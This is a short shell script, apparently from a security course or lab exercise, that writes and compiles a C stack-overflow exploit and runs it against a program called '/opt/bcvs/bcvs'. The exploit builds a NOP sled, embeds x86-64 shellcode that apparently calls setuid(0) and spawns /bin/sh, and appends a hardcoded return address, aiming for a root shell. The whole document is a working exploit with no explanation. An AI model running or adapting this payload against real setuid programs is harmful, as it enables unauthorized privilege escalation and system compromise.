
rm exploit.c
rm exploit

cat > exploit.c << EOL
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void main(int argc, char *argv[]){

  int pad = 168;
//found
  unsigned char shellcode[] =  "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
        "\x58\x0f\x05";


  char *ret = "\x20\xe8\xff\xff\xff\x7f";

  int size = strlen(shellcode) + strlen(ret) + pad + 1;

  char payload[size];

	//add nops for the offset
  memset(payload, '\x90', pad);

	//copy in the code after the padding 
  strcpy(payload + pad, shellcode);
  //copy in the return addr at the end of the shellcode
  strcpy(payload + pad + strlen(shellcode), ret);

	printf("%s", payload);

}
EOL

gcc -o exploit exploit.c

/opt/bcvs/bcvs ci "$(./exploit)"

